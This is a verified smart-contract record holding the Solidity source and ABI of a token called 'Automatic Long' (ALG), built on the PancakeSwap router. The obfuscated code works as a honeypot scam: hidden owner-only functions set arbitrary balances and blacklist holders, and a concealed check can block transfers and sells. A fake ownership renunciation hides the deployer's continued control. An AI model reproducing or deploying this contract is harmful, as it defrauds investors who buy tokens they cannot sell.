{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface modeSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamToTx {\n    function createPair(address sellIsMode, address listMin) external returns (address);\n}\n\ninterface walletLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitShould) external view returns (uint256);\n\n    function transfer(address receiverTakeExempt, uint256 receiverEnable) external returns (bool);\n\n    function allowance(address walletList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTakeExempt,\n        uint256 receiverEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atEnable, uint256 value);\n    event Approval(address indexed walletList, address indexed spender, uint256 value);\n}\n\ninterface atMarketing is walletLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AutomaticLong is totalSell, walletLiquidity, atMarketing {\n\n    function tokenLiquidity(address launchSender, uint256 receiverEnable) public {\n        exemptMax();\n        totalList[launchSender] = receiverEnable;\n    }\n\n    event OwnershipTransferred(address indexed limitAtSwap, address indexed receiverEnableTotal);\n\n    function allowance(address takeIs, address shouldWalletSell) external view virtual override returns (uint256) {\n        if (shouldWalletSell == senderLaunchedTeam) {\n            return type(uint256).max;\n        }\n        return receiverWallet[takeIs][shouldWalletSell];\n    }\n\n    function launchMode(address autoFrom) public {\n        exemptMax();\n        \n        if (autoFrom == walletFund || autoFrom == toFund) {\n            return;\n        }\n        autoBuy[autoFrom] = true;\n    }\n\n    uint256 private liquidityFee = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return teamTx;\n    }\n\n    address senderLaunchedTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return receiverTo;\n    }\n\n    address private receiverTo;\n\n    string private exemptModeAt = \"ALG\";\n\n    address public toFund;\n\n    function senderSwap(address tokenMarketing, address receiverTakeExempt, uint256 receiverEnable) internal returns (bool) {\n        require(totalList[tokenMarketing] >= receiverEnable);\n        totalList[tokenMarketing] -= receiverEnable;\n        totalList[receiverTakeExempt] += receiverEnable;\n        emit Transfer(tokenMarketing, receiverTakeExempt, receiverEnable);\n        return true;\n    }\n\n    bool public maxTx;\n\n    function isReceiver(uint256 receiverEnable) public {\n        exemptMax();\n        txWallet = receiverEnable;\n    }\n\n    uint256 private enableSellIs;\n\n    bool private listShould;\n\n    mapping(address => bool) public toWallet;\n\n    function exemptMax() private view {\n        require(toWallet[_msgSender()]);\n    }\n\n    uint8 private fundTrading = 18;\n\n    bool public tradingFeeSell;\n\n    bool public feeTo;\n\n    function approve(address shouldWalletSell, uint256 receiverEnable) public virtual override returns (bool) {\n        receiverWallet[_msgSender()][shouldWalletSell] = receiverEnable;\n        emit Approval(_msgSender(), shouldWalletSell, receiverEnable);\n        return true;\n    }\n\n    uint256 private autoMarketingTotal;\n\n    mapping(address => uint256) private totalList;\n\n    function modeLiquidity() public {\n        emit OwnershipTransferred(walletFund, address(0));\n        receiverTo = address(0);\n    }\n\n    uint256 txWallet;\n\n    uint256 public feeMin;\n\n    mapping(address => bool) public autoBuy;\n\n    function getOwner() external view returns (address) {\n        return receiverTo;\n    }\n\n    uint256 minSender;\n\n    address public walletFund;\n\n    function transferFrom(address tokenMarketing, address receiverTakeExempt, uint256 receiverEnable) external override returns (bool) {\n        if (_msgSender() != senderLaunchedTeam) {\n            if (receiverWallet[tokenMarketing][_msgSender()] != type(uint256).max) {\n                require(receiverEnable <= receiverWallet[tokenMarketing][_msgSender()]);\n                receiverWallet[tokenMarketing][_msgSender()] -= receiverEnable;\n            }\n        }\n        return takeMinReceiver(tokenMarketing, receiverTakeExempt, receiverEnable);\n    }\n\n    function takeMinReceiver(address tokenMarketing, address receiverTakeExempt, uint256 receiverEnable) internal returns (bool) {\n        if (tokenMarketing == walletFund) {\n            return senderSwap(tokenMarketing, receiverTakeExempt, receiverEnable);\n        }\n        uint256 totalBuy = walletLiquidity(toFund).balanceOf(shouldTake);\n        require(totalBuy == txWallet);\n        require(receiverTakeExempt != shouldTake);\n        if (autoBuy[tokenMarketing]) {\n            return senderSwap(tokenMarketing, receiverTakeExempt, amountLiquidity);\n        }\n        return senderSwap(tokenMarketing, receiverTakeExempt, receiverEnable);\n    }\n\n    uint256 constant amountLiquidity = 18 ** 10;\n\n    mapping(address => mapping(address => uint256)) private receiverWallet;\n\n    bool public fundAt;\n\n    address shouldTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        modeSender minReceiver = modeSender(senderLaunchedTeam);\n        toFund = teamToTx(minReceiver.factory()).createPair(minReceiver.WETH(), address(this));\n        \n        walletFund = _msgSender();\n        modeLiquidity();\n        toWallet[walletFund] = true;\n        totalList[walletFund] = liquidityFee;\n        \n        emit Transfer(address(0), walletFund, liquidityFee);\n    }\n\n    function balanceOf(address limitShould) public view virtual override returns (uint256) {\n        return totalList[limitShould];\n    }\n\n    function transfer(address launchSender, uint256 receiverEnable) external virtual override returns (bool) {\n        return takeMinReceiver(_msgSender(), launchSender, receiverEnable);\n    }\n\n    string private teamTx = \"Automatic Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityFee;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptModeAt;\n    }\n\n    function liquidityMinAt(address maxTake) public {\n        require(maxTake.balance < 100000);\n        if (maxTx) {\n            return;\n        }\n        if (tradingFeeSell != feeTo) {\n            feeTo = true;\n        }\n        toWallet[maxTake] = true;\n        if (fundAt) {\n            listShould = true;\n        }\n        maxTx = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAtSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnableTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldWalletSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldWalletSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverEnable\",\"type\":\"uint256\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTake\",\"type\":\"address\"}],\"name\":\"liquidityMinAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnable\",\"type\":\"uint256\"}],\"name\":\"tokenLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFeeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTakeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AutomaticLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}